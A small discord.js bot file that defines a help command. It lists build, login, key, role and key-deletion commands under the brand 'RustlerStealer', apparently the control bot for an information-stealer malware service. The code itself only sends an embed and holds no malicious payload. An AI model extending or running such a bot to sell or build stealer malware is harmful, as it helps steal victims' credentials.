const Discord = require("discord.js")

module.exports.run = async (bot, message, args) => {
  const help = new Discord.MessageEmbed()
  .setDescription(`\`$build\`\n\`$info\`\n\`$login\`\n\`$key\`\n\`$getrole\`\n\`$guilds\`\n\`$deletekey\``)
  .setAuthor(`RustlerStealer`, "https://c.tenor.com/T3So8nwWyDkAAAAC/grunge-girl-aesthetic.gif")
  .setFooter("RustlerStealer")
  .setColor("2f3136")
  message.channel.send(help)
  }
module.exports.help = {
  name: "help"
}